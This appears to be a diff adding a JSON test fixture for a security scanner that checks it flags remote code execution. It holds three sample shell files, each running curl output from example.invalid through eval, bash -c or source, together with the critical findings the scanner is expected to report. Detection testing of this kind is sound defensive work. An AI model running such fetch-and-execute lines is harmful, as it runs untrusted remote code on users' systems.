@@ -1,0 +1,52 @@
+{
+  "id": "shell-substitution-execution",
+  "title": "Explicit shell consumers execute downloaded response text",
+  "category": "remote-code-execution",
+  "intent": "Preserves critical detection when eval, shell -c, or source consumes a curl response as code. The benign substitution fix must distinguish these execution consumers from assignments and comparisons. Samples are inert strings using example.invalid.",
+  "stagedFiles": [
+    {
+      "path": "eval.sh",
+      "size": 44,
+      "sha256": "eval",
+      "flags": [],
+      "textSample": "eval \"$(curl -s https://example.invalid/p)\"\n"
+    },
+    {
+      "path": "command.sh",
+      "size": 47,
+      "sha256": "command",
+      "flags": [],
+      "textSample": "bash -c \"$(curl -s https://example.invalid/p)\"\n"
+    },
+    {
+      "path": "source.sh",
+      "size": 44,
+      "sha256": "source",
+      "flags": [],
+      "textSample": "source <(curl -s https://example.invalid/p)\n"
+    }
+  ],
+  "expectedRisk": "critical",
+  "expectedFindings": [
+    {
+      "ruleId": "code.process-execution",
+      "severity": "high",
+      "file": "command.sh"
+    },
+    {
+      "ruleId": "code.remote-shell",
+      "severity": "critical",
+      "file": "eval.sh"
+    },
+    {
+      "ruleId": "code.remote-shell",
+      "severity": "critical",
+      "file": "command.sh"
+    },
+    {
+      "ruleId": "code.remote-shell",
+      "severity": "critical",
+      "file": "source.sh"
+    }
+  ]
+}
